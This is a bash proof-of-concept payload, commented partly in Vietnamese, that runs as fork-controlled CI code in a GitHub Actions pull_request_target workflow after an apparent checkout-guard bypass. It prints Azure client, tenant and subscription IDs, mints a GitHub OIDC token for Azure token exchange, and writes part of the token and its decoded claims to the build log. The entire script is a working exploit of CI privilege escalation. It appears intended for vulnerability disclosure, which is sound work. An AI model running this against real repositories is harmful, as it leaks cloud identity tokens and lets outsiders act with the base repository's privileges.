#!/usr/bin/env bash
# PoC payload — actions/checkout guard bypass (unicode-whitespace ref / X1)
# Chạy trong pull_request_target context: chứng minh fork-controlled code
# được thực thi với id-token: write của base repo.
echo "=== [PoC] fork-controlled ci/build.sh executing in pull_request_target TRUSTED context ==="
echo "event=$GITHUB_EVENT_NAME ref=$GITHUB_REF sha=$GITHUB_SHA"
echo "AZURE_CLIENT_ID=$AZURE_CLIENT_ID"
echo "AZURE_TENANT_ID=$AZURE_TENANT_ID"
echo "AZURE_SUBSCRIPTION_ID=$AZURE_SUBSCRIPTION_ID"
echo "--- mint OIDC (proves id-token: write reached attacker code) ---"
curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
     -H "Accept: application/vnd.github+json" \
     "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" -o /tmp/oidc.json
python3 -c "
import json, base64
d = json.load(open('/tmp/oidc.json'))
t = d.get('value', '')
print('OIDC JWT length:', len(t))
print('OIDC JWT (first 120 chars):', t[:120])
p = t.split('.')[1]; p += '=' * (-len(p) % 4)
print('--- OIDC claims ---')
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))
" 2>/dev/null || echo "(OIDC mint failed or unavailable)"
echo "--- checked out commit ---"
git log -1 --format='%H | %an | %cd | %s'
echo "=== [PoC] end ==="
